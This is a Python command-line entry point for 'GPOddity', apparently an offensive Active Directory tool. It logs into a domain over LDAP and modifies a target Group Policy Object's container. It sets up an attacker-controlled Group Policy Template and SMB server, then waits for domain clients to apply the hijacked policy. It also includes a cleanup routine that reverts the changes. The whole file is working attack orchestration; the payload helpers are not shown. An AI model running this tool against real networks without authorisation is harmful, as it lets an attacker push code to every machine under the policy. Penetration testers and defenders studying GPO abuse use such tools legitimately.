import typer
import logging

from typing_extensions              import Annotated
from datetime                       import datetime
from time                           import sleep

from helpers.cli_config             import parse_config
from helpers.clean                  import clean_create_folder, revert_gpoddity_actions
from helpers.ldap                   import get_ldap_session, get_entry_attribute
from helpers.utils                  import bcolors, logger
from helpers.setup_gpc              import setup_gpc
from helpers.setup_gpt              import create_gpt
from helpers.servers                import start_servers

app = typer.Typer(context_settings={"help_option_names": ["-h", "--help"]}, add_completion=False, pretty_exceptions_enable=False, pretty_exceptions_short=True)

def set_verbosity(value):
    if value == 0:
        logger.setLevel(logging.WARN)
    elif value == 1:
        logger.setLevel(logging.INFO)
    elif value >= 2:
        logger.setLevel(logging.DEBUG)
    return value

@app.command()
def main(
    config: Annotated[str, typer.Option("--config", help="The configuration file for GPOddity")],
    clean: Annotated[str, typer.Option("--clean", help="This flag indicates that GPOddity should only perform cleaning actions. This argument takes the path to the cleaning directory containing the 'actions.json' file. In that case, only the 'domain' and authentication information are required in the configuration file")] = None,
    verbose: Annotated[int, typer.Option("--verbose", "-v", help="Enable verbose output (-v or -vv)", callback=set_verbosity, count=True)] = 0
):

    logger.warning(f"\n{bcolors.OKCYAN}[*] GPOddity execution - {datetime.now()}{bcolors.ENDC}")


    if clean is not None:
        cfg = parse_config(config, True)
        logger.warning(f"{bcolors.BOLD}[*] Cleaning up from cleaning folder '{clean}'{bcolors.ENDC}")
        cfg.clean_folder = clean
        cfg.ldap_session = get_ldap_session(cfg.domain, cfg.dc_ip, cfg.ldaps, cfg.username, cfg.password, cfg.kerberos)
        logger.warning(f"{bcolors.OKGREEN}[+] LDAP session established as {cfg.username}{bcolors.ENDC}")
        revert_gpoddity_actions(cfg)
        return


    # Parse Configuration
    cfg = parse_config(config)

    # Initialize Environment
    logger.warning(f"\n{bcolors.OKCYAN}[*] Initializing environment{bcolors.ENDC}")
    cfg.clean_folder = clean_create_folder()
    logger.warning(f"{bcolors.BOLD}[*] Clean folder is '{cfg.clean_folder}'{bcolors.ENDC}")

    # Initialize LDAP session
    logger.warning(f"\n{bcolors.OKCYAN}[*] Initializing LDAP session{bcolors.ENDC}")
    cfg.ldap_session = get_ldap_session(cfg.domain, cfg.dc_ip, cfg.ldaps, cfg.username, cfg.password, cfg.kerberos)
    logger.warning(f"{bcolors.OKGREEN}[+] LDAP session established as {cfg.username}{bcolors.ENDC}")

    # Get the target GPO version number. This also serves as existence check
    cfg.current_gpo_version = get_entry_attribute(cfg.ldap_session, cfg.gpo_dn, "versionNumber")
    logger.warning(f"\n{bcolors.BOLD}[*] Current GPO version number: {cfg.current_gpo_version}{bcolors.ENDC}")

    # Setup Group Policy Template
    logger.warning(f"\n{bcolors.OKCYAN}[*] Setting up Group Policy Template{bcolors.ENDC}")
    cfg.modules = create_gpt(cfg)

    # Start SMB server if needed
    logger.warning(f"\n{bcolors.OKCYAN}[*] Starting SMB server if needed{bcolors.ENDC}")
    start_servers(cfg, verbose)

    # Setup the target GPO Group Policy Container
    logger.warning(f"\n{bcolors.OKCYAN}[*] Setting up Group Policy Container{bcolors.ENDC}")
    setup_gpc(cfg)
    
    
    # Run and interrupt upon CTRL+C
    try:
        logger.warning(f"\n{bcolors.OKCYAN}[*] Waiting for clients to update their GPOs{bcolors.ENDC}")
        if cfg.smb_mode == "domain":
            logger.warning(f"{bcolors.BOLD}[!] SMB mode is 'domain'. Transfer the content of the {cfg.clean_folder}/GPT folder to the target SMB share (\\\\{cfg.smb_ip}\\{cfg.smb_share}){bcolors.ENDC}")
        while True:
            sleep(1)
    except KeyboardInterrupt:
        logger.warning(f"\n\n{bcolors.OKCYAN}[*] Exiting...{bcolors.ENDC}")
        
        # Refresh LDAP session
        cfg.ldap_session = get_ldap_session(cfg.domain, cfg.dc_ip, cfg.ldaps, cfg.username, cfg.password, cfg.kerberos)
        
        # Revert GPLink
        revert_gpoddity_actions(cfg)
        return


if __name__ == "__main__":
    app()
